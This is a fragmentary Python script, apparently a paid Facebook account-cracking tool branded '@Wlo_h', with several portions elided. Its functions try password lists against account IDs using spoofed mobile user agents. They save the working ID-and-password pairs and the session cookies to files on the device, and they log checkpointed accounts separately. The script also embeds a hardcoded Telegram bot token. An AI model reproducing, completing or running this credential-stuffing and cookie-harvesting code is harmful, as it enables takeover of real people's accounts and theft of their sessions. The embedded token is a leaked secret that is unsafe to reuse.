#import datetime;now = datetime.date.today();target = datetime.date(2034,3,6,)
#if now >=target:exit(" @Wlo_h لا ضوج 💲 راسلني حتى افعلك @$$")
#else:print("حﺎﺠﻨﺑ ﻞﻴﻐﺸﺗ ﻢﺗ✅")
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys

print('\n\033[1;37m ﺪﻴﺴﻟﺍ رﻮﻄﻤﻟﺍ 🥵...')
...
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31msiad\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mDEVELOPER  :  MR. SAID💥
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mMY CHANNEL : @Wlo_h
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTOOL       : ﻪﺛﺪﺤﻤﻟﺍ V5
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTELEGRAM   : Мυяαɒ Αℓαмɒαя🔱
\033[38;5;46m{+} \x1b[1;96m\33[38;5;196m: [★]PAID-𝗩05🔥\33[38;5;196m 
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31msiad\33[38;5;196m━━━━━━━━━━━━━━━━━━━━ 
""")
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32m@Wlo_h\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@Wlo_h-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/@Wlo_h-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@Wlo_h-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@Wlo_h-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@Wlo_h-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@Wlo_h] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@Wlo_h-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@Wlo_h-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Dalvik/2.1.0 (Linux; U; Android 6; CPH2251 Build/TP5A.448202.509) [FBAN/FB4A;FBAV/181.0.0.52;FBBV/97014627;FBDM/{density=3.1968991704306244,width=1079,height=1927};FBLC/ru_RU;FBRV/351274446;FBCR/Vodafone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.lite;FBDV/Oppo F4;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@Wlo_hCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        #print(data)
                        accessToken="7136869001:AAHDbEEajKy3yPWgwR7VNT8Dy0ZM36_30B0"
                        headers={
                                    "method": 'GET', 
    "path": '/',
    "scheme": 'https', 
    ...
    "sec-fetch-user": '?1',
    "upgrade-insecure-requests": '1',
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.150 Version/17.0 Mobile/15E148 Safari/604.1',
}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@Wlo_h-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@Wlo_h-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@Wlo_h_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@Wlo_h-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@Wlo_h-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
